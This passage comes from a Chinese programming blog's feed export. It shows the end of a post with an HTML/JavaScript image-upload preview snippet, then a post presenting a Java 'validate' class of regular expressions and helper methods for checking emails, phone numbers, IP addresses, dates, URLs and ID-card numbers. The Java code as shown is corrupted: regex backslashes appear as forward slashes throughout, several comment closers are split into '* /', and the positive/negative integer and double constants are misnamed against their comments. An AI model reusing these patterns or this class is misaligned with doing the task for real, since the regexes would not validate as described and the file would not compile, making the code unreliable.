<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;图片预览&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">//图片上传预览    IE是用了滤镜。</span></span><br><span class="line"><span class="string">function previewImage(file) &#123;</span></span><br><span class="line"><span class="string">var div = document.getElementById('previmage');</span></span><br><span class="line"><span class="string">var oldimg = div.firstChild;</span></span><br><span class="line"><span class="string">var w = oldimg.style.width;</span></span><br><span class="line"><span class="string">var h = oldimg.style.height;</span></span><br><span class="line"><span class="string">// console.log(w + ',' + h);</span></span><br><span class="line"><span class="string">if (file.files &amp;&amp; file.files[0]) &#123;</span></span><br><span class="line"><span class="string">div.innerHTML = "</span><span class="string">";</span></span><br><span class="line"><span class="string">var img = document.createElement("</span>img<span class="string">");</span></span><br><span class="line"><span class="string">img.style.width = w;</span></span><br><span class="line"><span class="string">img.style.height = h;</span></span><br><span class="line"><span class="string">div.appendChild(img);</span></span><br><span class="line"><span class="string">img.src = window.URL.createObjectURL(file.files[0]);</span></span><br><span class="line"><span class="string">&#125; else //兼容IE</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">file.select();</span></span><br><span class="line"><span class="string">file.blur();</span></span><br><span class="line"><span class="string">var imgSrc = document.selection.createRange().text;</span></span><br><span class="line"><span class="string">//必须设置初始大小</span></span><br><span class="line"><span class="string">div.style.width = w;</span></span><br><span class="line"><span class="string">div.style.height = h;</span></span><br><span class="line"><span class="string">//图片异常的捕捉，防止用户修改后缀来伪造图片</span></span><br><span class="line"><span class="string">div.style.filter = "</span>progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod=scale)<span class="string">";</span></span><br><span class="line"><span class="string">div.filters.item("</span>DXImageTransform.Microsoft.AlphaImageLoader<span class="string">").src = imgSrc;</span></span><br><span class="line"><span class="string">oldimg.style.display = "</span>none<span class="string">";</span></span><br><span class="line"><span class="string">document.selection.empty();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;By xxzkid&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;!-- 图片预览 --&gt;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;input type="</span>file<span class="string">" onchange="</span>previewImage(<span class="keyword">this</span>);<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">&lt;div id="</span>previmage<span class="string">"&gt;&lt;img src="</span><span class="string">" style="</span>width: <span class="number">200</span>px; height: <span class="number">200</span>px;<span class="string">" /&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;!-- PS：#previmage &gt; img 的width and height 一定要写在标签上，用class 或者id 选择器写的样式，在js中无法获取 --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 预览 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[正则表达式类]]></title>
      <url>/2014/java-regex-class/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 正则表达式类</p>
<p>这个类包含了项目中绝大多数要使用的正则表达式，具体看代码：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><span class="line">package org.xxz.util;</span><br><span class="line">import java.util.regex.Matcher;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author Jarvis</span><br><span class="line"> * 90%的验证都调用了Regular方法 但是本类也可删除大部分方法 涉及到正则的判断都直接穿参数和正则表达式</span><br><span class="line"> * 但是为了方便业务类调用和有更直观的含义 建议不要这么做</span><br><span class="line"> * Pattern的matcher已经被同步synchronized 所以 此类的任何使用正则验证的方法都不需要同步</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class validate &#123;</span><br><span class="line">	public validate()</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">/* ------------------常量定义 */</span><br><span class="line">/**</span><br><span class="line"> * Email正则表达式=^/w+([-+.]/w+)*@/w+([-.]/w+)*/./ w + ([-.] / w +) * $</span><br><span class="line">	* /</span><br><span class="line">	public static final String EMAIL = &quot;^//w+([-+.]//w+)*@//w+([-.]//w+)*//.//w+([-.]//w+)*$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 电话号码正则表达式= (^(/d&#123;2,4&#125;[-_－—]?)?/d&#123;3,8&#125;([-_－—]?/d&#123;3,8&#125;)?([-_－—]?/d&#123;1,7&#125;)?$)|(^0?1[35]/d&#123;9&#125;$)</span><br><span class="line"> */</span><br><span class="line">	public static final String PHONE = &quot;(^(//d&#123;2,4&#125;[-_－—]?)?//d&#123;3,8&#125;([-_－—]?//d&#123;3,8&#125;)?([-_－—]?//d&#123;1,7&#125;)?$)|(^0?1[35]//d&#123;9&#125;$)&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 手机号码正则表达式=^(13[0-9]|15[0|3|6|7|8|9]|18[8|9])/d&#123;8&#125;$</span><br><span class="line"> */</span><br><span class="line">	public static final String MOBILE = &quot;^(13[0-9]|15[0|3|6|7|8|9]|18[8|9])//d&#123;8&#125;$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * IP地址正则表达式 ((?:(?:25[0-5]|2[0-4]//d|[01]?//d?//d)//.)&#123;3&#125;(?:25[0-5]|2[0-4]//d|[01]?//d?//d))</span><br><span class="line"> */</span><br><span class="line">	public static final String IPADDRESS = &quot;((?:(?:25[0-5]|2[0-4]//d|[01]?//d?//d)//.)&#123;3&#125;(?:25[0-5]|2[0-4]//d|[01]?//d?//d))&quot;;</span><br><span class="line">/**</span><br><span class="line"> * Integer正则表达式 ^-?(([1-9]/d*$)|0)</span><br><span class="line"> */</span><br><span class="line">	public static final String INTEGER = &quot;^-?(([1-9]//d*$)|0)&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 正整数正则表达式 &gt;=0 ^[1-9]/d*|0$</span><br><span class="line"> */</span><br><span class="line">	public static final String INTEGER_NEGATIVE = &quot;^[1-9]//d*|0$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 负整数正则表达式 &lt;=0 ^-[1-9]/d*|0$</span><br><span class="line"> */</span><br><span class="line">	public static final String INTEGER_POSITIVE = &quot;^-[1-9]//d*|0$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * Double正则表达式 ^-?([1-9]/d*/./ d * | 0 /./ d*[1 - 9] / d * | 0 ? / .0 + | 0)$</span><br><span class="line">	* /</span><br><span class="line">	public static final String DOUBLE = &quot;^-?([1-9]//d*//.//d*|0//.//d*[1-9]//d*|0?//.0+|0)$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 正Double正则表达式 &gt;=0 ^[1-9]/d*/./ d * | 0 /./ d*[1 - 9] / d * | 0 ? / .0 + | 0$</span><br><span class="line">	* /</span><br><span class="line">	public static final String DOUBLE_NEGATIVE = &quot;^[1-9]//d*//.//d*|0//.//d*[1-9]//d*|0?//.0+|0$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 负Double正则表达式 &lt;= 0 ^(-([1-9]/d*/./ d * | 0 /./ d*[1 - 9] / d*) ) | 0 ? / .0 + | 0$</span><br><span class="line">	* /</span><br><span class="line">	public static final String DOUBLE_POSITIVE = &quot;^(-([1-9]//d*//.//d*|0//.//d*[1-9]//d*))|0?//.0+|0$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 年龄正则表达式 ^(?:[1-9][0-9]?|1[01][0-9]|120)$ 匹配0-120岁</span><br><span class="line"> */</span><br><span class="line">	public static final String AGE = &quot;^(?:[1-9][0-9]?|1[01][0-9]|120)$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 邮编正则表达式 [1-9]/d&#123;5&#125;(?!/d) 国内6位邮编</span><br><span class="line"> */</span><br><span class="line">	public static final String CODE = &quot;[1-9]//d&#123;5&#125;(?!//d)&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 匹配由数字、26个英文字母或者下划线组成的字符串 ^/w+$</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_ENG_NUM_ = &quot;^//w+$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 匹配由数字和26个英文字母组成的字符串 ^[A-Za-z0-9]+$</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_ENG_NUM = &quot;^//w+$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 匹配由26个英文字母组成的字符串 ^[A-Za-z]+$</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_ENG = &quot;^[A-Za-z]+$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 匹配中文字符 ^[/u0391-/uFFE5]+$</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_CHINA = &quot;^[/u0391-/uFFE5]+$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 过滤特殊字符串正则</span><br><span class="line"> * regEx=&quot;[`~!@#$%^&amp;*()+=|&#123;&#125;&apos;:;&apos;,//[//].&lt;&gt;/?~！@#￥%……&amp;*（）——+|&#123;&#125;【】‘；：”“’。，、？]&quot;;</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_SPECIAL = &quot;[`~!@#$%^&amp;*()+=|&#123;&#125;&apos;:;&apos;,//[//].&lt;&gt;/?~！@#￥%……&amp;*（）——+|&#123;&#125;【】‘；：”“’。，、？]&quot;;</span><br><span class="line">/**</span><br><span class="line"> * *只能输英文 数字 中文 ^[a-zA-Z0-9/u4e00-/u9fa5]+$</span><br><span class="line"> */</span><br><span class="line">	public static final String STR_ENG_CHA_NUM = &quot;^[a-zA-Z0-9/u4e00-/u9fa5]+$&quot;;</span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">/***</span><br><span class="line"> * 日期正则 支持：</span><br><span class="line"> * YYYY-MM-DD</span><br><span class="line"> * YYYY/MM/DD</span><br><span class="line"> * YYYY_MM_DD</span><br><span class="line"> * YYYYMMDD</span><br><span class="line"> * YYYY.MM.DD的形式</span><br><span class="line"> */</span><br><span class="line">	public static final String DATE_ALL = &quot;((^((1[8-9]//d&#123;2&#125;)|([2-9]//d&#123;3&#125;))([-/////._]?)(10|12|0?[13578])([-/////._]?)(3[01]|[12][0-9]|0?[1-9])$)&quot; +</span><br><span class="line">					      &quot;|(^((1[8-9]//d&#123;2&#125;)|([2-9]//d&#123;3&#125;))([-/////._]?)(11|0?[469])([-/////._]?)(30|[12][0-9]|0?[1-9])$)&quot; +</span><br><span class="line">					      &quot;|(^((1[8-9]//d&#123;2&#125;)|([2-9]//d&#123;3&#125;))([-/////._]?)(0?2)([-/////._]?)(2[0-8]|1[0-9]|0?[1-9])$)|(^([2468][048]00)([-/////._]?)(0?2)([-/////._]?)(29)$)|(^([3579][26]00)&quot; +</span><br><span class="line">					      &quot;([-/////._]?)(0?2)([-/////._]?)(29)$)&quot; +</span><br><span class="line">					      &quot;|(^([1][89][0][48])([-/////._]?)(0?2)([-/////._]?)(29)$)|(^([2-9][0-9][0][48])([-/////._]?)&quot; +</span><br><span class="line">					      &quot;(0?2)([-/////._]?)(29)$)&quot; +</span><br><span class="line">					      &quot;|(^([1][89][2468][048])([-/////._]?)(0?2)([-/////._]?)(29)$)|(^([2-9][0-9][2468][048])([-/////._]?)(0?2)&quot; +</span><br><span class="line">					      &quot;([-/////._]?)(29)$)|(^([1][89][13579][26])([-/////._]?)(0?2)([-/////._]?)(29)$)|&quot; +</span><br><span class="line">					      &quot;(^([2-9][0-9][13579][26])([-/////._]?)(0?2)([-/////._]?)(29)$))&quot;;</span><br><span class="line">/**</span><br><span class="line"> * URL正则表达式</span><br><span class="line"> * 匹配 http www ftp</span><br><span class="line"> */</span><br><span class="line">	public static final String URL = &quot;^(http|www|ftp|)?(://)?(//w+(-//w+)*)(//.(//w+(-//w+)*))*((://d+)?)(/(//w+(-//w+)*))*(//.?(//w)*)(//?)?&quot; +</span><br><span class="line">					 &quot;(((//w*%)*(//w*//?)*(//w*:)*(//w*//+)*(//w*//.)*(//w*&amp;)*(//w*-)*(//w*=)*(//w*%)*(//w*//?)*&quot; +</span><br><span class="line">					 &quot;(//w*:)*(//w*//+)*(//w*//.)*&quot; +</span><br><span class="line">					 &quot;(//w*&amp;)*(//w*-)*(//w*=)*)*(//w*)*)$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 身份证正则表达式</span><br><span class="line"> */</span><br><span class="line">	public static final String IDCARD = &quot;((11|12|13|14|15|21|22|23|31|32|33|34|35|36|37|41|42|43|44|45|46|50|51|52|53|54|61|62|63|64|65)[0-9]&#123;4&#125;)&quot; +</span><br><span class="line">					    &quot;(([1|2][0-9]&#123;3&#125;[0|1][0-9][0-3][0-9][0-9]&#123;3&#125;&quot; +</span><br><span class="line">					    &quot;[Xx0-9])|([0-9]&#123;2&#125;[0|1][0-9][0-3][0-9][0-9]&#123;3&#125;))&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 1.匹配科学计数 e或者E必须出现有且只有一次 不含Dd</span><br><span class="line"> * 正则 ^[-+]?(/d+(/./d*)?|/./d+)([eE]([-+]?([012]?/d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))$</span><br><span class="line"> */</span><br><span class="line">	public final static String SCIENTIFIC_A = &quot;^[-+]?(//d+(//.//d*)?|//.//d+)([eE]([-+]?([012]?//d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 2.匹配科学计数 e或者E必须出现有且只有一次 结尾包含Dd</span><br><span class="line"> * 正则 ^[-+]?(/d+(/./d*)?|/./d+)([eE]([-+]?([012]?/d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))[dD]?$</span><br><span class="line"> */</span><br><span class="line">	public final static String SCIENTIFIC_B = &quot;^[-+]?(//d+(//.//d*)?|//.//d+)([eE]([-+]?([012]?//d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))[dD]?$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 3.匹配科学计数 是否含有E或者e都通过 结尾含有Dd的也通过（针对Double类型）</span><br><span class="line"> * 正则 ^[-+]?(/d+(/./d*)?|/./d+)([eE]([-+]?([012]?/d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))?[dD]?$</span><br><span class="line"> */</span><br><span class="line">	public final static String SCIENTIFIC_C = &quot;^[-+]?(//d+(//.//d*)?|//.//d+)([eE]([-+]?([012]?//d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))?[dD]?$&quot;;</span><br><span class="line">/**</span><br><span class="line"> * 4.匹配科学计数 是否含有E或者e都通过 结尾不含Dd</span><br><span class="line"> * 正则 ^[-+]?(/d+(/./d*)?|/./d+)([eE]([-+]?([012]?/d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))?$</span><br><span class="line"> */</span><br><span class="line">	public final static String SCIENTIFIC_D = &quot;^[-+]?(//d+(//.//d*)?|//.//d+)([eE]([-+]?([012]?//d&#123;1,2&#125;|30[0-7])|-3([01]?[4-9]|[012]?[0-3])))?$&quot;;</span><br><span class="line">/* //------------------验证方法 */</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为空 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static synchronized boolean StrisNull( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(null == str || str.trim().length() &lt;= 0 ? true : false);</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是非空 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean StrNotNull( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(!StrisNull( str ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 字符串null转空</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static String nulltoStr( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(StrisNull( str ) ? &quot;&quot; : str);</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 字符串null赋值默认值</span><br><span class="line"> * @param str 目标字符串</span><br><span class="line"> * @param defaut 默认值</span><br><span class="line"> * @return String</span><br><span class="line"> */</span><br><span class="line">	public static String nulltoStr( String str, String defaut )</span><br><span class="line">	&#123;</span><br><span class="line">		return(StrisNull( str ) ? defaut : str);</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为Email 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isEmail( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, EMAIL ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断是否为电话号码 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isPhone( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, PHONE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断是否为手机号码 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isMobile( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, MOBILE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断是否为Url 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isUrl( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, URL ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断是否为IP地址 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isIpaddress( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, IPADDRESS ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 判断字段是否为数字 正负整数 正负浮点数 符合返回ture</span><br><span class="line"> * @param str</span><br><span class="line"> * @return boolean</span><br><span class="line"> */</span><br><span class="line">	public static boolean isNumber( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		return(Regular( str, DOUBLE ) );</span><br><span class="line">	&#125;</span><br><span class="line">/**</span><br><span class="line"> * 